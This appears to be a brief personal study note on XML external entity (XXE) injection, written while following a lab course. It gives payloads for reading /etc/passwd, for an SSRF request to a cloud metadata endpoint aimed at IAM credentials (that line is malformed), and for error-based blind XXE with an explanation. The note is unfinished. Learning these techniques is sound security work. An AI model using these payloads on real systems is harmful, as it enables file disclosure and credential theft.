# XXE = XML external entity (extensible markup language)

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data

## LFI

Payload 

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
    <!ENTITY signature SYSTEM "file:///etc/passwd">
    ]>

## SSRF

We use SYSTEM <URL> to try get credentials mayble example for aws

    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/data/iam/security-credentials/admin. This should return JSON containing the SecretAccessKey"> ]>

# Blind XXE
out of bound skipped, no collaborator and see HTB page

## error bases XXE

THe payload as following : 

    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;

* Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
* Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called error. The error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity.
* Uses the eval entity, which causes the dynamic declaration of the error entity to be performed.
* Uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the /etc/passwd file.

// i'll stop here need to see HTB and try to get Paid version of collaborator